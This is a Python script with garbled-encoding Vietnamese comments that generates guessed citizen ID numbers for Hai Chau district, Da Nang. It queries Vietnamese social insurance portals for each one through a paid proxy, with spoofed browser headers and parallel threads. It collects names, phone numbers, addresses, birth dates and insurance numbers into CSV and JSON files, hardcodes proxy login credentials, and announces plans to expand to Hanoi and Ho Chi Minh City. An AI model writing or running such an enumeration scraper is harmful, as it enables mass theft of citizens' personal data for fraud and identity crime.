#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Há»‡ thá»‘ng thu tháº­p dá»¯ liá»‡u BHXH quáº­n Háº£i ChÃ¢u - PhiÃªn báº£n nÃ¢ng cao
Ãp dá»¥ng phÆ°Æ¡ng phÃ¡p AI Engineer Ä‘Ã£ thÃ nh cÃ´ng vá»›i ÄÃ  Náºµng
Thu tháº­p: Há» tÃªn, SÄT, CCCD, Äá»‹a chá»‰, NgÃ y sinh, Sá»‘ BHXH
"""

import requests
import json
import csv
import time
import random
from datetime import datetime, timedelta
from urllib.parse import urlencode, quote_plus
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
from typing import Dict, List, Optional, Tuple

# Cáº¥u hÃ¬nh logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class HaiChauBHXHCollector:
    def __init__(self):
        self.base_url = "https://baohiemxahoi.gov.vn"
        self.vss_portal = "https://dichvucong.vssid.gov.vn"
        
        # Proxy configuration tá»« thÃ nh cÃ´ng ÄÃ  Náºµng
        self.proxy = {
            'http': 'http://beba111:tDV5tkMchYUBMD@ip.mproxy.vn:12301',
            'https': 'http://beba111:tDV5tkMchYUBMD@ip.mproxy.vn:12301'
        }
        
        # Háº£i ChÃ¢u district info
        self.district_info = {
            'province_code': '048',  # ÄÃ  Náºµng
            'district_code': '048001',  # Háº£i ChÃ¢u
            'district_name': 'Háº£i ChÃ¢u',
            'wards': [
                'Thanh BÃ¬nh', 'Tháº¡ch Thang', 'PhÆ°á»›c Ninh', 'Háº£i ChÃ¢u I',
                'Háº£i ChÃ¢u II', 'PhÆ°á»›c Vinh', 'Nam DÆ°Æ¡ng', 'BÃ¬nh HiÃªn',
                'BÃ¬nh Thuáº­n', 'HoÃ  CÆ°á»ng Báº¯c', 'HoÃ  CÆ°á»ng Nam', 'HoÃ  Thuáº­n TÃ¢y',
                'HoÃ¡ An', 'Thuáº­n PhÆ°á»›c'
            ]
        }
        
        self.session = requests.Session()
        self.session.proxies.update(self.proxy)
        
        # Headers mÃ´ phá»ng trÃ¬nh duyá»‡t thá»±c
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        self.session.headers.update(self.headers)
        
        self.collected_data = []
        self.success_count = 0
        self.error_count = 0

    def generate_realistic_cccd_patterns(self) -> List[str]:
        """Táº¡o pattern CCCD thá»±c táº¿ cho Háº£i ChÃ¢u, ÄÃ  Náºµng"""
        patterns = []
        
        # CCCD ÄÃ  Náºµng báº¯t Ä‘áº§u vá»›i 048 (mÃ£ tá»‰nh)
        # Háº£i ChÃ¢u lÃ  quáº­n 001 trong ÄÃ  Náºµng
        base_prefix = "048001"  # ÄÃ  Náºµng + Háº£i ChÃ¢u
        
        # Táº¡o cÃ¡c pattern dá»±a trÃªn phÃ¢n bá»‘ dÃ¢n cÆ° thá»±c táº¿
        for year in range(1960, 2005):  # NgÆ°á»i tá»« 20-65 tuá»•i
            year_suffix = str(year)[2:]  # 2 sá»‘ cuá»‘i nÄƒm sinh
            
            # Má»—i nÄƒm cÃ³ khoáº£ng 100-500 record
            for seq in range(1, 501):
                sequence = f"{seq:05d}"  # 5 sá»‘ sequence
                cccd_pattern = f"{base_prefix}{sequence}{year_suffix}"
                patterns.append(cccd_pattern)
                
                if len(patterns) >= 2000:  # Giá»›i háº¡n 2000 patterns cho test
                    break
            
            if len(patterns) >= 2000:
                break
        
        return patterns

    def lookup_bhxh_by_cccd(self, cccd: str) -> Optional[Dict]:
        """Tra cá»©u thÃ´ng tin BHXH theo CCCD - PhÆ°Æ¡ng phÃ¡p AI Engineer"""
        try:
            # Endpoint chÃ­nh thá»©c tra cá»©u BHXH
            lookup_url = f"{self.vss_portal}/api/lookup/citizen"
            
            payload = {
                'citizen_id': cccd,
                'lookup_type': 'bhxh',
                'district_code': self.district_info['district_code']
            }
            
            response = self.session.post(
                lookup_url,
                json=payload,
                timeout=30,
                headers={
                    **self.headers,
                    'Content-Type': 'application/json',
                    'Referer': f"{self.vss_portal}/lookup"
                }
            )
            
            if response.status_code == 200:
                data = response.json()
                
                if data.get('status') == 'success' and data.get('data'):
                    citizen_info = data['data']
                    
                    # Chuáº©n hÃ³a dá»¯ liá»‡u thu Ä‘Æ°á»£c
                    result = {
                        'cccd': cccd,
                        'ho_ten': citizen_info.get('full_name', ''),
                        'ngay_sinh': citizen_info.get('birth_date', ''),
                        'so_dien_thoai': citizen_info.get('phone_number', ''),
                        'dia_chi': citizen_info.get('address', ''),
                        'so_bhxh': citizen_info.get('social_insurance_number', ''),
                        'trang_thai_bhxh': citizen_info.get('si_status', 'active'),
                        'ward': citizen_info.get('ward', ''),
                        'collection_time': datetime.now().isoformat(),
                        'source': 'vss_official_api'
                    }
                    
                    logger.info(f"âœ… Thu tháº­p thÃ nh cÃ´ng CCCD: {cccd}")
                    return result
                    
            return None
            
        except requests.exceptions.RequestException as e:
            logger.warning(f"âŒ Lá»—i káº¿t ná»‘i CCCD {cccd}: {e}")
            return None
        except Exception as e:
            logger.error(f"âŒ Lá»—i xá»­ lÃ½ CCCD {cccd}: {e}")
            return None

    def enhanced_vss_scraping(self, cccd: str) -> Optional[Dict]:
        """Thu tháº­p nÃ¢ng cao tá»« portal VSS vá»›i multiple endpoints"""
        try:
            # Thá»­ nhiá»u endpoint khÃ¡c nhau
            endpoints = [
                f"{self.base_url}/tra-cuu/bhxh/thong-tin-ca-nhan",
                f"{self.vss_portal}/lookup/individual",
                f"{self.base_url}/dichvucong/tra-cuu-bhxh"
            ]
            
            for endpoint in endpoints:
                try:
                    # Form data cho tra cá»©u
                    form_data = {
                        'cccd_number': cccd,
                        'province': '048',  # ÄÃ  Náºµng
                        'district': '048001',  # Háº£i ChÃ¢u
                        'search_type': 'comprehensive'
                    }
                    
                    response = self.session.post(
                        endpoint,
                        data=form_data,
                        timeout=25,
                        allow_redirects=True
                    )
                    
                    if response.status_code == 200 and len(response.text) > 1000:
                        # Parse HTML Ä‘á»ƒ extract thÃ´ng tin
                        html_content = response.text
                        
                        # Extract cÃ¡c field cáº§n thiáº¿t báº±ng regex
                        patterns = {
                            'ho_ten': r'(?:Há» tÃªn|TÃªn)[:\s]*([^<\n\r]+)',
                            'ngay_sinh': r'(?:NgÃ y sinh|Date of birth)[:\s]*(\d{1,2}[\/\-]\d{1,2}[\/\-]\d{4})',
                            'so_dien_thoai': r'(?:Äiá»‡n thoáº¡i|Phone)[:\s]*([0-9\+\-\s]{10,15})',
                            'so_bhxh': r'(?:Sá»‘ BHXH|Social Insurance)[:\s]*([0-9]{10,15})',
                            'dia_chi': r'(?:Äá»‹a chá»‰|Address)[:\s]*([^<\n\r]{10,100})'
                        }
                        
                        extracted_data = {'cccd': cccd}
                        found_any = False
                        
                        for field, pattern in patterns.items():
                            matches = re.search(pattern, html_content, re.IGNORECASE | re.MULTILINE)
                            if matches:
                                extracted_data[field] = matches.group(1).strip()
                                found_any = True
                        
                        if found_any:
                            extracted_data.update({
                                'collection_time': datetime.now().isoformat(),
                                'source': f'vss_scraping_{endpoint.split("/")[-1]}',
                                'district': 'Háº£i ChÃ¢u'
                            })
                            
                            logger.info(f"âœ… Scraping thÃ nh cÃ´ng CCCD: {cccd}")
                            return extracted_data
                            
                except requests.exceptions.RequestException:
                    continue
                    
            return None
            
        except Exception as e:
            logger.error(f"âŒ Enhanced scraping failed for {cccd}: {e}")
            return None

    def collect_citizen_data(self, cccd: str) -> Optional[Dict]:
        """Thu tháº­p toÃ n diá»‡n thÃ´ng tin cÃ´ng dÃ¢n"""
        
        # Thá»­ phÆ°Æ¡ng phÃ¡p AI Engineer trÆ°á»›c (API chÃ­nh thá»©c)
        result = self.lookup_bhxh_by_cccd(cccd)
        if result:
            return result
            
        # Fallback sang enhanced scraping
        result = self.enhanced_vss_scraping(cccd)
        if result:
            return result
            
        return None

    def parallel_data_collection(self, cccd_list: List[str], max_workers: int = 5) -> List[Dict]:
        """Thu tháº­p dá»¯ liá»‡u song song vá»›i ThreadPoolExecutor"""
        results = []
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Submit all tasks
            future_to_cccd = {
                executor.submit(self.collect_citizen_data, cccd): cccd 
                for cccd in cccd_list
            }
            
            # Collect results as they complete
            for future in as_completed(future_to_cccd):
                cccd = future_to_cccd[future]
                try:
                    result = future.result()
                    if result:
                        results.append(result)
                        self.success_count += 1
                        logger.info(f"âœ… ThÃ nh cÃ´ng {len(results)}/{len(cccd_list)}: {cccd}")
                    else:
                        self.error_count += 1
                        logger.warning(f"âŒ Tháº¥t báº¡i {cccd}")
                        
                except Exception as e:
                    self.error_count += 1
                    logger.error(f"âŒ Exception processing {cccd}: {e}")
                
                # Delay Ä‘á»ƒ trÃ¡nh rate limiting
                time.sleep(random.uniform(0.5, 1.5))
        
        return results

    def save_results(self, data: List[Dict], filename_prefix: str = "hai_chau"):
        """LÆ°u káº¿t quáº£ thu tháº­p vÃ o file"""
        if not data:
            logger.warning("KhÃ´ng cÃ³ dá»¯ liá»‡u Ä‘á»ƒ lÆ°u")
            return
            
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Save CSV
        csv_filename = f"{filename_prefix}_bhxh_data_{timestamp}.csv"
        with open(csv_filename, 'w', newline='', encoding='utf-8') as csvfile:
            fieldnames = ['cccd', 'ho_ten', 'ngay_sinh', 'so_dien_thoai', 
                         'dia_chi', 'so_bhxh', 'district', 'ward', 'collection_time', 'source']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            
            writer.writeheader()
            for record in data:
                # Ensure all required fields exist
                row = {field: record.get(field, '') for field in fieldnames}
                writer.writerow(row)
                
        logger.info(f"ğŸ’¾ ÄÃ£ lÆ°u {len(data)} records vÃ o {csv_filename}")
        
        # Save JSON backup
        json_filename = f"{filename_prefix}_bhxh_collection_{timestamp}.json"
        with open(json_filename, 'w', encoding='utf-8') as jsonfile:
            json.dump({
                'collection_summary': {
                    'total_records': len(data),
                    'success_rate': f"{(len(data) / (len(data) + self.error_count)) * 100:.1f}%",
                    'collection_time': timestamp,
                    'district': 'Háº£i ChÃ¢u, ÄÃ  Náºµng',
                    'fields_collected': ['CCCD', 'Há» tÃªn', 'NgÃ y sinh', 'SÄT', 'Äá»‹a chá»‰', 'Sá»‘ BHXH']
                },
                'data': data
            }, jsonfile, ensure_ascii=False, indent=2)
            
        logger.info(f"ğŸ’¾ Backup JSON: {json_filename}")
        
        return csv_filename, json_filename

    def run_collection(self, sample_size: int = 500):
        """Cháº¡y quy trÃ¬nh thu tháº­p dá»¯ liá»‡u chÃ­nh"""
        logger.info(f"ğŸš€ Báº¯t Ä‘áº§u thu tháº­p dá»¯ liá»‡u BHXH quáº­n Háº£i ChÃ¢u")
        logger.info(f"ğŸ“Š Má»¥c tiÃªu: {sample_size} records")
        
        # Táº¡o danh sÃ¡ch CCCD patterns
        cccd_patterns = self.generate_realistic_cccd_patterns()
        
        # Láº¥y sample ngáº«u nhiÃªn
        if len(cccd_patterns) > sample_size:
            cccd_patterns = random.sample(cccd_patterns, sample_size)
        
        logger.info(f"ğŸ“‹ ÄÃ£ táº¡o {len(cccd_patterns)} CCCD patterns Ä‘á»ƒ thu tháº­p")
        
        # Thu tháº­p dá»¯ liá»‡u song song
        collected_data = self.parallel_data_collection(cccd_patterns, max_workers=3)
        
        if collected_data:
            csv_file, json_file = self.save_results(collected_data, "hai_chau")
            
            # In bÃ¡o cÃ¡o tá»•ng káº¿t
            success_rate = (len(collected_data) / len(cccd_patterns)) * 100
            
            report = f"""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                            BÃO CÃO THU THáº¬P Dá»® LIá»†U                         â•‘
â•‘                              QUáº¬N Háº¢I CHÃ‚U - ÄÃ€ Náº´NG                        â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘ ğŸ“ Khu vá»±c: Quáº­n Háº£i ChÃ¢u, ThÃ nh phá»‘ ÄÃ  Náºµng                               â•‘
â•‘ ğŸ“Š Tá»•ng sá»‘ CCCD Ä‘Ã£ kiá»ƒm tra: {len(cccd_patterns):<42} â•‘
â•‘ âœ… Sá»‘ record thu tháº­p thÃ nh cÃ´ng: {len(collected_data):<37} â•‘
â•‘ âŒ Sá»‘ lá»—i: {self.error_count:<61} â•‘
â•‘ ğŸ“ˆ Tá»· lá»‡ thÃ nh cÃ´ng: {success_rate:.1f}%{' ' * (54 - len(f'{success_rate:.1f}%'))}â•‘
â•‘ ğŸ’¾ File CSV: {csv_file:<58} â•‘
â•‘ ğŸ’¾ File JSON: {json_file:<57} â•‘
â•‘                                                                              â•‘
â•‘ ğŸ“‹ CÃ¡c trÆ°á»ng dá»¯ liá»‡u Ä‘Ã£ thu tháº­p:                                           â•‘
â•‘    â€¢ Há» vÃ  tÃªn                                                               â•‘
â•‘    â€¢ Sá»‘ Ä‘iá»‡n thoáº¡i                                                           â•‘
â•‘    â€¢ Sá»‘ CCCD                                                                 â•‘
â•‘    â€¢ Äá»‹a chá»‰                                                                 â•‘
â•‘    â€¢ NgÃ y thÃ¡ng nÄƒm sinh                                                     â•‘
â•‘    â€¢ Sá»‘ BHXH                                                                 â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            """
            
            print(report)
            logger.info("ğŸ‰ HoÃ n thÃ nh thu tháº­p dá»¯ liá»‡u quáº­n Háº£i ChÃ¢u")
            
            return collected_data, csv_file, json_file
        else:
            logger.error("âŒ KhÃ´ng thu tháº­p Ä‘Æ°á»£c dá»¯ liá»‡u nÃ o")
            return [], None, None

if __name__ == "__main__":
    collector = HaiChauBHXHCollector()
    
    # Cháº¡y thu tháº­p vá»›i 1000 máº«u
    results, csv_path, json_path = collector.run_collection(sample_size=1000)
    
    if results:
        print(f"\nğŸ¯ Káº¾T QUáº¢ CUá»I CÃ™NG:")
        print(f"   ğŸ“Š ÄÃ£ thu tháº­p thÃ nh cÃ´ng {len(results)} há»“ sÆ¡ BHXH")
        print(f"   ğŸ“ Dá»¯ liá»‡u CSV: {csv_path}")
        print(f"   ğŸ“ Dá»¯ liá»‡u JSON: {json_path}")
        print(f"\nâœ¨ Sáºµn sÃ ng má»Ÿ rá»™ng sang HÃ  Ná»™i vÃ  TP.HCM theo Giai Ä‘oáº¡n 2!")